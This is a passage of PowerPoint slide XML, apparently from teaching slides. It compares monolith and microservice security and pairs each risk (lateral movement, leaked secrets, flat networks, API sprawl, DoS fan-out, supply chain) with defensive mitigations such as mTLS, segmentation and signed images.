          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>1.2.1 - </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mj-lt"/>
                <a:cs typeface="+mj-lt"/>
              </a:rPr>
              <a:t>Monolith Security Overview</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Content Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{F02BF23D-5D15-13F2-6453-B75E564A5119}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="838200" y="1825625"/>
            <a:ext cx="9166771" cy="4692924"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr vert="horz" lIns="91440" tIns="45720" rIns="91440" bIns="45720" rtlCol="0" anchor="t">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Fewer trust boundaries</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>: most calls are function calls, not networks—smaller lateral-movement surface.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Centralized secrets</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>: one secret store; fewer copies in flight.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Uniform patching</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>: one place to update TLS libs, frameworks.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>But: blast radius is total</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>—an RCE often means “own the app + the DB.”</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Role hygiene risk</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>: “God-mode” app user in the database; least privilege often neglected.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:ea typeface="+mn-lt"/>
              <a:cs typeface="+mn-lt"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="27929686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B997F-EAD1-6518-458B-C6E8D0498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CBAE3-D9C7-09D1-7210-F9D986D57A55}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>1.2.1 - </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mj-lt"/>
                <a:cs typeface="+mj-lt"/>
              </a:rPr>
              <a:t>Microservices</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Content Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{42C361B9-6C2C-086F-1B16-2E67E3962D02}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="838200" y="1825625"/>
            <a:ext cx="5688076" cy="4692924"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr vert="horz" lIns="91440" tIns="45720" rIns="91440" bIns="45720" rtlCol="0" anchor="t">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>A </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>suite of small, independently deployable services</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t> that communicate over the network (HTTP/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" err="1">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>gRPC</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>/queues). </a:t>
            </a:r>
            <a:endParaRPr lang="en-US"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Prefer separate databases per service.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="37117120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B7A7E-B5BA-5864-5234-5DC5DDAF2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E46D4-4B7E-7568-74DB-4A80A50A5124}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>1.2.1 - </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mj-lt"/>
                <a:cs typeface="+mj-lt"/>
              </a:rPr>
              <a:t>MS Security Concerns 01</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Content Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{8E179746-D534-918B-313E-2C0B452184C2}"/>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Distributed trust boundaries</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Risk:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t> A compromise in one service can pivot laterally via internal APIs if calls aren’t strongly authenticated/authorized. </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Mutual TLS  (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" err="1">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>mTLS</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>) for all service-to-service traffic</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Strong service identities (e.g., SPIFFE) and short-lived tokens with audience scoping</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Enforce per-endpoint </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" err="1">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>authZ</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t> (OPA/ABAC/RBAC)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Deny-by-default internal APIs</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Least-privilege between services</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="42519622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DB6AC-D764-6611-C12F-7D739297F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E8A7C-D144-8001-78AB-9D30F21F3618}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>1.2.1 - </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mj-lt"/>
                <a:cs typeface="+mj-lt"/>
              </a:rPr>
              <a:t>MS Security Concerns 02</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Content Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{8265E1A0-6AE2-DE02-FB4E-431781534A2A}"/>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Secrets across services</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" b="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Risk:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t> More processes means more places to leak DB/API credentials—through env vars, logs, or build artifacts.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Centralized secret manager/KMS; dynamic, short-lived credentials</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Scope secrets per service/namespace; avoid sharing and broad mounts</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Prevent secret exposure in logs/crash dumps</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="31939165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EAF6-F522-5F79-E726-FBE9AC39C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D715-137E-CED8-CE55-92FFC7BB32BD}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>1.2.1 - </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mj-lt"/>
                <a:cs typeface="+mj-lt"/>
              </a:rPr>
              <a:t>MS Security Concerns 03</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Content Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{76F74D1E-3911-90D7-3DFB-E1FAE434EDF9}"/>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Flat service network</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" b="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Risk:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t> Cluster networks are often “flat”; once inside, attackers can probe other services, metadata endpoints, and data stores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Strict Network Policies/segmentation</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Egress allow-lists and egress gateways; block metadata services</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Separate/admin paths behind stronger auth and network boundaries</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Rate limits and per-service throttles even for internal calls</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="34834311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5B029-3D3C-669F-9C6F-CFFC2F732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3B9C9-D1C5-362E-794C-FB792319C399}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>1.2.1 - </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mj-lt"/>
                <a:cs typeface="+mj-lt"/>
              </a:rPr>
              <a:t>MS Security Concerns 04</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Content Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{7EED2FE2-E69D-ECE2-C44A-00D574F9FB94}"/>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Sprawling API surface</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" b="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Risk:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t> More edges = larger attack surface. One weak endpoint can expose data or enable pivoting inward.</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Central API gateway/WAF with schema validation and threat mitigations</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Consistent </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" err="1">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>authn</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>/z, CSRF/nonce handling, and input validation per API</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Default rate limits, quotas, and DDoS protections per route/version</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0">
              <a:ea typeface="+mn-lt"/>
              <a:cs typeface="+mn-lt"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="2809822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2912-5A01-6239-4DAF-3CC18B5E1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DA1FD-E299-F037-C4D6-3154512CBC38}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>1.2.1 - </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mj-lt"/>
                <a:cs typeface="+mj-lt"/>
              </a:rPr>
              <a:t>MS Security Concerns 05</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Content Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{284322D5-A496-2599-31C5-644CED723BA8}"/>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Cascading failures/DoS fan-out</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" b="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Risk:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t> One hot endpoint can fan out to many downstream calls; an attacker (or bug) can exhaust resources across services.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Timeouts, bulkheads, and circuit breakers on every hop</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Isolate heavy jobs into worker tiers</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Queues/back-pressure</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Per-service CPU/memory/request limits</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0">
              <a:ea typeface="+mn-lt"/>
              <a:cs typeface="+mn-lt"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="16531907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A53D3-3AE0-8527-B315-E502EF78B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6D6FE-844F-C660-641F-35E55670D58A}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>1.2.1 - </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mj-lt"/>
                <a:cs typeface="+mj-lt"/>
              </a:rPr>
              <a:t>MS Security Concerns 06</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Content Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{2371C4DA-5736-2807-757A-1950D799DCA4}"/>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Supply chain &amp; runtime isolation</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" b="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Risk:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t> A single poisoned dependency or corrupted image can introduce RCE. Shared nodes raise container-escape and privilege risks.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Signed images (e.g., </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" err="1">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Sigstore</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>), SBOMs, and continuous image/SCA scans</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Minimal, pinned base images; verify builds and lock CI secrets</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
